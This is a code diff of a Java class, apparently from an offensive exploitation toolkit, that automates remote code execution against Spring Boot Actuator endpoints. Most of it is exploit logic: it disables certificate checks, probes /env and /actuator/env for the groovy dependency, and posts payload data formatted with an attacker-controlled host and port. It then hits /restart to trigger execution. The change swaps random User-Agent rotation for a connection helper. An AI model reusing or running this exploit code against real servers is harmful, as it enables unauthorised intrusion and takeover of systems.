@@ -1,19 +1,17 @@
 package src.main.module;
 
-import src.main.common.UA_Config;
+import src.main.common.HTTPConfig;
 import src.main.impl.ResultCallback;
 
 import java.io.*;
 import java.net.HttpURLConnection;
-import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.util.Base64;
-import java.util.List;
 import java.util.Scanner;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-import static src.main.SSLVerify.sslVer.disableSSLVerification;
+import static src.main.ssl.sslVer.disableSSLVerification;
 
 public class LoggingGroovyRCE {
     private String address;
@@ -40,17 +38,11 @@ public class LoggingGroovyRCE {
         String resapi = "/restart";
         String site = address + api;
         String resite = address + resapi;
-        String ua = "";
         String data = "";
         disableSSLVerification();
         data = String.format(expdata1, vpsIP + ":" + vpsPORT);
         try {
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
             int responseCode = conn.getResponseCode();
@@ -68,10 +60,7 @@ public class LoggingGroovyRCE {
                     text = String.format("groovy 依赖为: %s", matcher.group(1));
                     callback.onResult(text);
                     try {
-                        URL obj1 = new URL(site);
-                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                        ua = uacf.getRandomUserAgent(ualist);
-                        conn1.setRequestProperty("User-Agent", ua);
+                        HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                         conn1.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                         conn1.setRequestMethod("POST");
                         conn1.setDoOutput(true);
@@ -82,10 +71,7 @@ public class LoggingGroovyRCE {
                         int responseCode1 = conn1.getResponseCode();
                         if (responseCode1 == HttpURLConnection.HTTP_OK) {
                             try {
-                                URL obj2 = new URL(resite);
-                                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
-                                ua = uacf.getRandomUserAgent(ualist);
-                                conn2.setRequestProperty("User-Agent", ua);
+                                HttpURLConnection conn2 = HTTPConfig.createConnection(resite);
                                 conn2.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                                 conn2.setRequestMethod("POST");
                                 conn2.setDoOutput(true);
@@ -127,17 +113,11 @@ public class LoggingGroovyRCE {
         String resapi = "/actuator/restart";
         String site = address + api;
         String resite = address + resapi;
-        String ua = "";
         String data = "";
         disableSSLVerification();
         data = String.format(expdata2, vpsIP + ":" + vpsPORT);
         try {
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
             int responseCode = conn.getResponseCode();
@@ -155,10 +135,7 @@ public class LoggingGroovyRCE {
                     text = String.format("groovy 依赖为: %s", matcher.group(1));
                     callback.onResult(text);
                     try {
-                        URL obj1 = new URL(site);
-                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
-                        ua = uacf.getRandomUserAgent(ualist);
-                        conn1.setRequestProperty("User-Agent", ua);
+                        HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                         conn1.setRequestProperty("Content-Type", "application/json");
                         conn1.setRequestMethod("POST");
                         conn1.setDoOutput(true);
@@ -184,10 +161,7 @@ public class LoggingGroovyRCE {
                         int responseCode1 = conn1.getResponseCode();
                         if (responseCode1 == HttpURLConnection.HTTP_OK) {
                             try {
-                                URL obj2 = new URL(resite);
-                                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
-                                ua = uacf.getRandomUserAgent(ualist);
-                                conn2.setRequestProperty("User-Agent", ua);
+                                HttpURLConnection conn2 = HTTPConfig.createConnection(resite);
                                 conn2.setRequestProperty("Content-Type", "application/json");
                                 conn2.setRequestMethod("POST");
                                 conn2.setDoOutput(true);
@@ -227,15 +201,9 @@ public class LoggingGroovyRCE {
         String llib = "groovy";
         String api = "/env";
         String site = address + api;
-        String ua = "";
         disableSSLVerification();
         try {
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
             int responseCode = conn.getResponseCode();
@@ -252,10 +220,8 @@ public class LoggingGroovyRCE {
                 if (matcher.find()) {
                     text = String.format("groovy 依赖为: %s", matcher.group(1));
                     callback.onResult(text);
-                    URL obj1 = new URL(address + "/actuator");
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                     conn1.setDoOutput(true);
-                    conn1.setRequestProperty("User-Agent", ua);
                     conn1.setRequestMethod("GET");
                     int responseCode1 = conn1.getResponseCode();
                     BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
@@ -284,15 +250,9 @@ public class LoggingGroovyRCE {
         String llib = "groovy";
         String api = "/actuator/env";
         String site = address + api;
-        String ua = "";
         disableSSLVerification();
         try {
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent", ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             conn.setDoOutput(true);
             int responseCode = conn.getResponseCode();
@@ -309,10 +269,8 @@ public class LoggingGroovyRCE {
                 if (matcher.find()) {
                     text = String.format("groovy 依赖为: %s", matcher.group(1));
                     callback.onResult(text);
-                    URL obj1 = new URL(address + "/actuator");
-                    HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                     conn1.setDoOutput(true);
-                    conn1.setRequestProperty("User-Agent", ua);
                     conn1.setRequestMethod("GET");
                     int responseCode1 = conn1.getResponseCode();
                     BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
@@ -341,15 +299,9 @@ public class LoggingGroovyRCE {
     public void Exp(ResultCallback callback){
         String api = "/actuator/env";
         String site = address + api;
-        String ua = "";
         disableSSLVerification();
         try{
-            URL obj = new URL(site);
-            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
-            UA_Config uacf = new UA_Config();
-            List<String> ualist = uacf.loadUserAgents();
-            ua = uacf.getRandomUserAgent(ualist);
-            conn.setRequestProperty("User-Agent",ua);
+            HttpURLConnection conn = HTTPConfig.createConnection(site);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK) {
